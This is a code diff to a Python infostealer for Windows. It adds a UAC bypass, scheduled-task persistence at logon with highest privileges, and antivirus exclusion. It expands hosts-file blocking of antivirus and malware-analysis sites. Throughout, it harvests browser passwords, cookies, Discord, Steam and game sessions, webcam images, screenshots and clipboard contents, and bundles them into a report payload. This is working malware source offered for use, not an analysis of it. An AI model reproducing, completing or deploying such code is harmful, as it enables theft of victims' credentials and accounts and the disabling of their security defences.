@@ -25,17 +25,35 @@ import windows.security
 import windows.generated_def as gdef
 import string
 import conf.config as config
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES, ChaCha20_Poly1305
 from PIL import ImageGrab
 from contextlib import contextmanager
 from datetime import datetime
+from uac_bypass import *
 from io import BytesIO
 
 multiprocessing.freeze_support()
 
+
+cookie_count: int = 0
+password_count: int = 0
+autofill_count: int = 0
+browsing_history: int = 0
+discord_accounts: int = 0
+minecraft_sessions: int = 0
+gd_session = 0
+steam_session = 0
+ss_success = 0
+webcam_success = 0
+process_count = 0
+clipboard_success = 0
+system_info = 0
+bypass_success = 0
+
 def write(file, content):
     with open(file, 'a', encoding='utf-8') as f:
         f.write(content)
+
 username = os.getenv('username')
 pcname = os.getenv('COMPUTERNAME')
 
@@ -241,19 +259,6 @@ def randstr(length: int):
     rndmstr = ''.join(random.choice(characters) for i in range(length))
     return rndmstr
 
-cookie_count: int = 0
-password_count: int = 0
-autofill_count: int = 0
-browsing_history: int = 0
-discord_accounts: int = 0
-minecraft_sessions: int = 0
-gd_session = 0
-steam_session = 0
-ss_success = 0
-webcam_success = 0
-process_count = 0
-clipboard_success = 0
-system_info = 0
 
 def get_master_key(local_state_path):
     try:
@@ -631,10 +636,16 @@ def anti_vm():
     return False
 
 def persistence(copypath):
+    taskname = "kirkyboiiii"
     try:
         shutil.copy2(sys.executable, copypath)
-
-        subprocess.run('schtasks /create /sc onlogon /tn kirkyboiiii /tr "{}" /rl highest'.format(copypath), shell=True, check=True)
+        existing = subprocess.run('schtasks /query /tn {} /v /fo list'.format(taskname), shell=True, capture_output=True, text=True)
+        if not copypath in existing.stdout:
+            subprocess.run('schtasks /delete /tn {} /f'.format(taskname), shell=True, check=True, text=True, capture_output=True)
+        else:
+            return
+        subprocess.run('schtasks /create /sc onlogon /tn {} /tr "{}" /rl highest'.format(taskname, copypath), shell=True, check=True, text=True, capture_output=True)
+            
 
     except Exception as e:
         print('persistence failed', e)
@@ -1272,10 +1283,38 @@ def blockwebsite(url):
 
 def blockantivirus():
     if config.blocksites:
-        avwebsites = ['avast.com', 'avg.com', 'malwarebytes.com', 'kaspersky.com', 'norton.com', 'bitdefender.com', 'mcafee.com', 'trendmicro.com', 'sophos.com', 'avira.com']
+        with open(os.path.join(os.getenv('systemroot'), 'System32', 'drivers', 'etc', 'hosts'), 'r') as f:
+            existing_hosts = f.read()
+
+        language_codes = ["en", "es", "de", "fr", "ru", "zh", "ja", "ko", "pt", "hi", "it", "ar", "nl", "sv", "no", "fi", "da", "pl", "tr"]
+        country_codes = ["us", "gb", "de", "fr", "ru", "cn", "jp", "kr", "br", "in", "it", "es", "ca", "au", "nl", "se", "ch", "be", "dk", "app"]
+        avwebsites = ['avast.com', 'avg.com', 'malwarebytes.com', 'kaspersky.com', 'norton.com', 'bitdefender.com', 'mcafee.com', 'trendmicro.com', 'sophos.com', 'avira.com', 'f-secure.com', 'panda.com', 'webroot.com', 'eset.com', 'adaware.com', 'zonealarm.com', 'virustotal.com', 'virustotal.com/gui/home/upload', 'virustotal.com/gui/home/url', 'virustotal.com/gui/home/search', 'metadefender.com', 'jotti.org', 'analyze.phishtank.com', 'urlscan.io', 'hybrid-analysis.com', 'any.run', 'malshare.com']
+        if 'SIXkssvenKirksjsdkajdaskd.6741' in existing_hosts and len(existing_hosts.splitlines()) > 10000 and any(site in existing_hosts for site in avwebsites) in existing_hosts:
+            return
         for site in avwebsites:
             blockwebsite(site)
+            for languagecode in language_codes:
+                blockwebsite(f'{languagecode}.{site}')
+            for countrycode in country_codes:
+                blockwebsite(f'{countrycode}.{site}')
+            for languagecode in language_codes:
+                for countrycode in country_codes:
+                    blockwebsite(f'{site}/{languagecode}/{countrycode}')
+                    blockwebsite(f'{site}/{countrycode}/{languagecode}')
+                    blockwebsite(f'{site}/{languagecode}-{countrycode}')
+                    blockwebsite(f'{site}/{countrycode}-{languagecode}')
+            blockwebsite('SIXkssvenKirksjsdkajdaskd.6741')
             blockwebsite('www.' + site)
+            for languagecode in language_codes:
+                blockwebsite(f'www.{languagecode}.{site}')
+            for countrycode in country_codes:
+                blockwebsite(f'www.{countrycode}.{site}')
+            for languagecode in language_codes:
+                for countrycode in country_codes:
+                    blockwebsite(f'www.{site}/{languagecode}/{countrycode}')
+                    blockwebsite(f'www.{site}/{countrycode}/{languagecode}')
+                    blockwebsite(f'www.{site}/{languagecode}-{countrycode}')
+                    blockwebsite(f'www.{site}/{countrycode}-{languagecode}')
 
 
 def makepath():
@@ -1334,13 +1373,27 @@ if appdpath:
     copypath = appdpath + '\\dakirk.exe'
 else:
     copypath = sys.executable
+is_vm = anti_vm()
 
 if config.antivm:
     if is_vm:
         sys.exit(0)
 
 if not isadmin():
-    askforadmin()
+    if config.uacbypass:
+        if GetSelf()[1]:
+            try:
+                if UACbypass():
+                    os._exit(0)
+                    bypass_success = 1
+            except:
+                if UACbypass(1):
+                    os._exit(0)
+                    bypass_success = 1
+            else: askforadmin()
+        else:
+            askforadmin()
+    else: askforadmin()
 
 e1 = threading.Thread(target=exclusion, args=(sys.executable,))
 e1.start()
@@ -1355,11 +1408,9 @@ e3.start()
 #exclusion(copypath)
 #exclusion(os.getenv('userprofile'))
 
-kill()
 thread = threading.Thread(target=persistence, args=(copypath,))
 thread.start()
-is_vm = anti_vm()
-funcs = [systeminfo, get_webcam, get_clipboard, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus]
+funcs = [systeminfo, get_webcam, get_clipboard, screenshot, kill, stealchromium, stealchromiumv20, stealgecko, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus]
 # systeminfo()
 # screenshot()
 # kill()
@@ -1443,6 +1494,7 @@ System Info: {'Yes' if system_info == 1 else 'No'}
 Screenshot: {"Yes" if ss_success == 1 else "No"}
 Wi-Fi Networks: {str(wifiprofiles)}
 VM: {'Yes' if is_vm else 'No'}
+UAC Bypass: {'Yes' if bypass_success else 'No'}
 Credentials: {download}
         '''
         payload = {
